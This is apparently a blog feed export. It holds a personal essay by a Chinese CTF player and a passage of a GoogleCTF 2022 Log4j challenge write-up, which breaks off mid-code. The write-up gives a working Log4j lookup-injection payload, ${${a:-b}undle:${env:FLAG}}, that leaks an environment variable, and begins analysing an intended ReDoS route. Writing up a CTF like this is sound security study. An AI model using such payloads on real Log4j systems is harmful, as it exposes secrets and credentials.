      <url>/2022/07/09/year/2022/7/%E4%B8%B4%E8%A1%8C%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="临行随笔"><a href="#临行随笔" class="headerlink" title="临行随笔"></a>临行随笔</h1><p>临走了，简单谈谈我的感受，最近几年带给我的成长无疑是巨大的，从什么时候开始感觉自己真正成长呢？其实有几个瞬间，一是我能放弃现实追逐理想，二是我发现我的表达欲正在逐渐消失(能慢慢专注于提高自己)，三是拥有一颗平淡的心，关于这点之后会慢慢说来</p><p>正式进入川大前我读了一年预科，这一年其实给我带来了很多，从高中心里的阴霾走了出来(现在一直觉得高中那会儿我很傻，从阳光到孤独)，到了大学新的环境我犹如新生一般，慢慢开始接纳新的事物，本来走向阴郁的心开始打开，这一年里我蜕变了很多，体重从144降低到120以下，重新变得爱笑，变得喜欢在人前表现自己，这一年当中我感觉到我活出了自己，这是最有意义的一刻，但其实我知道这一切都是健身给我带来的，每天三小时的训练让我学会了忍耐，学会了付出，这一年里我很开心，也很伤心，我很开始是因为我发现我用心对待周围的同学，帮他们解决他们的问题，我很伤心是因为他们说我是老师的舔狗，我那时就在想，我不求成绩，不求回报，只是一味的喜欢表现自己帮助他人，虽然那时候我可能真的有些地方不太会说话(这来自于我本能的肆无忌惮)，特别是最后由于预科最后需要综合成绩选专业，我那时候第一次感觉到为什么明明就是学生，为什么可以这么势力，为什么可以无缘无故喷人，在那时候我才发现原来这里不再是高中，无人管控人性在释放，还记得在最后一次听老师安排下帮女同学们搬完宿舍，那时候我终于控制不住了，我在女生宿舍下的长凳上哭的很伤心，伤心真心付出被伤害，伤心别人的不理解，其实我知道在那一刻开始我慢慢变得不再热心，但那时候的我可没意识到</p><p>那时候还不错综合排名前几名，选到了自己想选择的网安，至于为什么选择这个专业理由很简单，我从来不是因为钱选择成为一名黑客，小时候还记得初中就看着网上那些黑客的故事很酷，但自己没有老师找不到教程(不会搜索引擎)，但那时候我却阴差阳错学了一些易语言，会一点简单的编程做过一些好玩的小软件，喜欢瞎点家里的电脑，记得那时候挖到一个漏洞(那时候还没意识到这就是黑客)，是一个搜题软件的，本来靠每天签到回答问题才能获得寥寥无几的金币，但我通过接口泄漏成功得到几亿金币，在那一天我疯狂的看别人的付费帖子开心的像个傻子，但也止步于此了，应试教育让我不得不放弃并且那时候也从没认识到这会是未来的一个职业，高中高考前无聊也学了一些c语言，还记得别人在复习而我在纸上手写代码的日子，虽然只有短短几天，原因也是因为书籍写的晦涩难懂加上我没有编程的思想</p><p>到了网安专业，大一那一年，我仍然迷茫，我只知道我要上好每一堂课，但是越学越迷茫，于是我拼了命的去学习课表上的高数，线性代数，还有一些通识课程，但我不快乐，我能深深感受到真正快乐的时候是我在c语言课堂上我如痴如醉的听着老师讲着我不会的东西，还在课下通过网上的例子学会了飞机大战这也是我第一个学习的游戏，当然也是最后一个游戏，我还热爱计算机系统导论课程，原因则只是因为太过简单，别人拼了命的学习也不如我课题摸鱼的成果，而我知道这些得益于我小时候喜欢喜欢折腾电脑有关，也只有这两节课让我感受到了我在学习计算机，哦对了，还有CTF新生赛虽然被暴打但是题目也不是特别难，让我第一次接触到了一丝的安全，可是也只是仅限于一些简单的F12，F5,burpsuite，hackbar?</p><p>真正让我开始产生脱变的时候还是大一下，由于疫情我只能呆在家里，由于网课的无聊我开始学习python，开始走向开发(其实是爬虫)，我写了半年的爬虫学会了数据分析，学会了正则匹配，学会了做一些词云图，也学会了一些简单的反爬机制的绕过，这学期我还因为黄老师的课学会了面向对象的开发，第一次入手Java开发，不仅用python实现了很多便捷的脚本，同时又转化为Java，还学会了Java web，特别是课程上写一堆屎一样的代码但实现了最终的功能的那段时间里我很开心，开心我能学以致用，也很开心通过半年的开发学习，至少因为这些基础我攻防世界新手区的题我能独立完成，高手区也能做一两道，但我又很伤心，伤心在于我在学高数，在学大学物理，一样的迷茫，我买了本精简版的吉米多维奇的书刷题刷我的高数，刷我的概率统计，我像疯了一样的把厚厚的两本书都做了一两遍，但越做我越迷茫，特别是当我看到我高数成绩98分，当我得知我综合排名第三的那一刻我更慌了，为什么？因为我不知道这一年内我学会了什么？我好像什么都学了，但是我好像又什么都不会，我只知道我会高数，我数学很牛逼！但我似乎不太会网络安全，当时我在好兄弟的寝室做了一个重大的决定，我屁股坐在他的滑板上就在寝室当中往前滑又往后滑，最后我挣扎了很久放弃保研的路，为什么会挣扎？因为我成绩太好了，我其实很舍不得我那个名次？但我意识到那不是我所热爱的</p><p>就这样到了大二，我开始疯狂恶补网安的知识看着网络上各个前辈发的视频，我很过瘾OWASP TOP10的原理我基本上都懂了，这时候由于我的努力被校队的CTF战队看上了，我成功进入了梦寐以求的战队，又疯狂开始刷CTF题，先是简单的攻防世界的题，很好高手区做了一页很满足，后面太难我看不懂没做了，又去刷CTFHUB技能树还有BUGKU，刷了两三遍吧，不断重复不断思考，但我还是难受，总觉得还是少了点什么，后面我知道了是那股激情，而这股激情来源于我第一次忍下心花了99元买了CTFSHOW的VIP，我很爽，拿着一个又一个的一血，最开心的时候莫过于刷了一题打开群聊，里面显示着“恭喜Y4tacker获得xxx分类xxx题一血/二血/三血”，就这样过了半年，到了大二上尾声那段时间我又迷茫了，我不知道我能做什么，比赛题我都不会就会点简单的，就在家里麻木的做着CTFSHOW，后面不知道怎么的突然开窍了，AK了很多比赛也赢得了一点小名声又把我救了回来，可是感受着别人的吹捧，我又陷入了迷茫，因为这时候我到了大二下，听学长说到了大三就要实习了，但我不会实战，我只会做一些题，我到底能干什么？那时候我不太喜欢黑盒因为我基础不扎实，因为我菜，因此我选择了白盒，从第一次打开PHP代码，一行一行搜着我不懂的函数，到后面我能完整分析一个简单的框架，中途收获了很多CNVD通用编号，也通过一个月赚到了CNVD一千多块钱的京东卡给家里买了东西，我很开心，但后面我意识到我只有很小一部分漏洞危害很大其他的说白了就是垃圾洞，什么反序列化链，什么后台RCE，特别是当时看到一个师傅说反序列化也算洞？我又开始迷茫了，为了逃避我拉黑了那位师傅，这也是第一次拉黑一个人，虽然我知道做法不对，但我真的很难受，在那时候我开始提交CVE，但没什么思路只是把我最屌的两个洞从CNVD搬到了CVE而已，也仅此而已，在这期间我又AK了很多比赛，但还是走不出心里的怪圈，开始变得孤独(因为打比赛很孤独只有我自己做一个方向)，但我也变得更爱思考</p><p>再到后来国赛，强网杯都拿到奖后，我又迷茫了，这一次是因为我大三了，眼看着就快准备实习了我发现我太菜了，我时常问我自己，只会做点题有什么意义？于是我开始拓展我的知识面，阴差阳错进了p神的代码审计星球，心里付款的时候还是很难受(不习惯知识付费，平时都是网上白嫖资料)，但后来进去以后又觉得很值得，因为我从这里学会了一点Java安全，从一开始懵懵懂懂到后面能结合实际思考我想这方面得益于p牛文字的魅力(p牛是一个很有意思的黑客，他喜欢去思考开发为什么会这样写？这样写的意义是什么？)，后来从无知到能做一点Java的CTF题，再到能AK比赛的Java题，这段过程也是奇妙的，后面我发现我经常遗忘于是又写了个JavaSec的github仓库，一开始内容很烂粗制滥造，但慢慢写的写的看着内容逐渐丰富，对代码的思考注解深入，对实战的理解也逐步加深，这个时候我觉得是很有趣的，虽然那时候不会Java审计挖洞，但我学的时候总会往实战方面想，虽然有些东西不一定能用，但我学会了思考，之后到了大三上期末我又迷茫了，第一次面试就面试大厂我真的手足无措，明明很多会的但就是说不出来，我开始自闭开始觉得自己就是一个废物，但最终还是花了半个月走了出去，总结了教训以后后面又面了长亭，很开心我第一次通过了面试可是因为疫情原因封校我又不得不推掉这份实习，后来到了春节我很无聊，看着阿里云举办的webshell挑战赛本着学习的态度，从绞尽脑汁花一天时间搞出个绕过的样本，到后面思路注解打开最终也拿到了第三名的名次，可以负责任的说那时候我不知道java的webshell该如何写我只知道<code>Runtime.getRuntime.exec()</code>也只知道还可以通过反射可以调用更底层去使其变得更复杂到我回去深入思考，会去对实战与代码的碰撞，会从编译的角度构造畸形webshell，当然也只是很皮毛，但无疑那十多天我很开心交了十多个样本赚了一万多块钱，后面也终于到了实习的时候，我也认真准备投了好几个地方，很开心都过了但我还是想去阿里云尽管它的流程很慢，尽管中间有一段锁hc的插曲，但功夫不负有心人，徐师能看中我，能信任我，我很开心，但我也很迷茫因为我始终是觉得自己菜的，但我不想辜负主管对我的期望，也希望我能最终实现自己的目标，能变得更厉害，当然中间还有一段小插曲我发现虽然躺平两年，得益于我的成绩我的竞赛我发现居然还能保研，然后得到某top高校认可，可是我终究还是觉得读研不适合我，我终究还是为了理想忘掉了现实，但结果也不赖不是么？</p><p>在这一刻我真正觉得自己有所成长，不在乎外面的说法，能知道我想要什么，还有较低的社交欲望。虽然未来我仍然迷茫，虽然我不是很强，但是我还是要继续向前，不为其他的，就为了能实现儿时的梦！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCTF2022-Log4j</title>
      <link href="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/"/>
      <url>/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="GoogleCTF2022-Log4j"><a href="#GoogleCTF2022-Log4j" class="headerlink" title="GoogleCTF2022-Log4j"></a>GoogleCTF2022-Log4j</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>唯一一个Java题了，挺有意思的一道题学到很多</p><p>题目附件：<a href="https://github.com/google/google-ctf/tree/master/2022/web-log4j">https://github.com/google/google-ctf/tree/master/2022/web-log4j</a></p><h2 id="非预期分析"><a href="#非预期分析" class="headerlink" title="非预期分析"></a>非预期分析</h2><p>题目给了一个公网环境(题目似乎没有重启，能猜到不可能是RCE)以及附件压缩包，里面同时有python以及java的环境，先简单看看python的，这里运行了web服务，将输入作为分割传入chat函数后通过subprocess调用命令执行并返回结果，这里不存在命令注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        text = request.form[<span class="string">&#x27;text&#x27;</span>].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        cmd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(text) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&#x27;invalid message&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(text) &lt; <span class="number">2</span>:</span><br><span class="line">            cmd = text[<span class="number">0</span>]</span><br><span class="line">            text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd, text = text[<span class="number">0</span>], <span class="string">&#x27; &#x27;</span>.join(text[<span class="number">1</span>:])</span><br><span class="line">        result = chat(cmd, text)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chat</span>(<span class="params">cmd, text</span>):</span></span><br><span class="line">    <span class="comment"># run java jar with a 10 second timeout</span></span><br><span class="line">    res = subprocess.run([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;-Dcmd=&#x27;</span> + cmd, <span class="string">&#x27;chatbot/target/app-1.0-SNAPSHOT.jar&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, text], capture_output=<span class="literal">True</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(res.stderr.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> res.stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    port = os.environ[<span class="string">&#x27;PORT&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;port&#x27;</span> <span class="keyword">in</span> os.environ <span class="keyword">else</span> <span class="number">1337</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=port)</span><br></pre></td></tr></table></figure><p>因此重点就是分析这个java的文件，很简单的代码(同时可以看到这里有LOG4J2)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.lang.System;</span><br><span class="line"><span class="keyword">import</span> java.time.format.DateTimeFormatter;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> Logger LOGGER = LogManager.getLogger(App.class);</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[]args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取环境变量当中的flag,同时这里可以知道我们需要获取到环境变量</span></span><br><span class="line">    String flag = System.getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="keyword">null</span> || !flag.startsWith(<span class="string">&quot;CTF&quot;</span>)) &#123;</span><br><span class="line">        LOGGER.error(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Contact admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//日志输出命令行参数</span></span><br><span class="line">    LOGGER.info(<span class="string">&quot;msg: &#123;&#125;&quot;</span>, args);</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement bot commands</span></span><br><span class="line">    String cmd = System.getProperty(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmd.equals(<span class="string">&quot;help&quot;</span>)) &#123;</span><br><span class="line">      doHelp();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!cmd.startsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;The command should start with a /.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据命令行参数执行doCommand，简单可以看出这里没什么利用</span></span><br><span class="line">    doCommand(cmd.substring(<span class="number">1</span>), args);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doCommand</span><span class="params">(String cmd, String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;help&quot;</span>:</span><br><span class="line">        doHelp();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;repeat&quot;</span>:</span><br><span class="line">        System.out.println(args[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;time&quot;</span>:</span><br><span class="line">        DateTimeFormatter dtf = DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy/M/d H:m:s&quot;</span>);</span><br><span class="line">        System.out.println(dtf.format(LocalDateTime.now()));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;wc&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> (args[<span class="number">1</span>].isEmpty()) &#123;</span><br><span class="line">          System.out.println(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          System.out.println(args[<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>).length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        System.out.println(<span class="string">&quot;Sorry, you must be a premium member in order to run this command.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doHelp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Try some of our free commands below! \nwc\ntime\nrepeat&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时发现这里有个<code>log4j2.xml</code>的配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_ERR&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; %-5level %logger&#123;36&#125; executing $&#123;sys:cmd&#125; - %msg %n&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">PatternLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;debug&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看见这里的Root的level设置为debug，<code>这代表如果没有单独指定Logger</code>， 那么就会使用该Root日志输出输出，因此就算我们能解析到<code>$&#123;env:FLAG&#125;</code>也不可能拿到结果(因为这是在日志而不是标准输出当中)，因此我们有没有办法讲结果输出到标准输出呢，当然答案是有的也造成了这次非预期，如果我们单独设置了Logger的话，如果那个日志策略会输出到标准输出那么就可以解决这个问题</p><p>这里说一下其中一个就可以，也就是这个<code>org.apache.logging.log4j.core.lookup.ResourceBundleLookup</code>，要执行<code>LOGGER.warn</code>只需要满足下面两个条件之一即可，这里简单测试一下<code>$&#123;bundle:2333&#125;</code><img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/1.png"></p><p>发现这个LOGGER确实能将关键信息带到标准输出<img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/2.png"></p><p>因此我们只需要输入<code>$&#123;bundle:$&#123;env:FLAG&#125;&#125;</code>即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;a:-b&#125;undle:$&#123;env:FLAG&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/3.png"></p><h2 id="预期分析-redos"><a href="#预期分析-redos" class="headerlink" title="预期分析-redos"></a>预期分析-redos</h2><p>猜测可能是非预期了所以搞了个新的题，将同样的payload输入后页面只是显示<code>Sensitive information detected in output. Censored for security reasons.</code></p><p>这里会检测内容，根据猜测能够知道肯定是把那个ResourceBundleLookup下的<code>LOGGER.warn</code>的输出特征给过滤掉了，这里简单fuzz下证实了我的猜测，毕竟这里是有doCommand功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doCommand</span><span class="params">(String cmd, String[] args)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;help&quot;</span>:</span><br><span class="line">      doHelp();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;repeat&quot;</span>:</span><br><span class="line">      System.out.println(args[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;time&quot;</span>:</span><br><span class="line">      DateTimeFormatter dtf = DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy/M/d H:m:s&quot;</span>);</span><br><span class="line">      System.out.println(dtf.format(LocalDateTime.now()));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;wc&quot;</span>:</span><br><span class="line">      <span class="keyword">if</span> (args[<span class="number">1</span>].isEmpty()) &#123;</span><br><span class="line">        System.out.println(<span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        System.out.println(args[<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>).length);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      System.out.println(<span class="string">&quot;Sorry, you must be a premium member in order to run this command.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要通过repeat功能即可，成功验证了猜想，因此不需要考虑payload的问题了</p><p><img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/4.png"></p><p>那怎么半呢其实这里还有一个小细节，对于log4j2的日志的实现来说其实是先将<code>$&#123;xx&#125;</code>当中的内容做替换再按我们规定的输出格式输出(如果是你去实现这样的功能相信这是目前为止的最优解)，具体代码这里就不展开了，接着说明</p><p>其实log4j2对日志输出中的<code>%d/%p</code>等其实是有自己的实现的，它有个注解比如下面这个是<code>%d</code>的他们都是有个注解<code>ConverterKeys</code>，因此我们可以看看这个有没有一些神奇的东西可以配合我们完成</p><p><img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/5.png"></p><h3 id="如何扫描并获取包下被指定注解的类"><a href="#如何扫描并获取包下被指定注解的类" class="headerlink" title="如何扫描并获取包下被指定注解的类"></a>如何扫描并获取包下被指定注解的类</h3><p>为了方便我这里直接用了reflections 框架（此框架依赖com.google.guava）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.reflections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>reflections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.guava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>guava<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>21.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因此我们可以扫描指定包下的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Reflections f = <span class="keyword">new</span> Reflections(<span class="string">&quot;org.apache.logging.log4j.core&quot;</span>);</span><br><span class="line">Set&lt;Class&lt;?&gt;&gt; set = f.getTypesAnnotatedWith(ConverterKeys.class);</span><br><span class="line"><span class="keyword">for</span> (Class&lt;?&gt; tmp:set)&#123;</span><br><span class="line">  <span class="keyword">if</span> (tmp.isInterface())&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;interface:&quot;</span>+tmp.getName());</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;class:&quot;</span>+tmp.getName());</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到如下结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 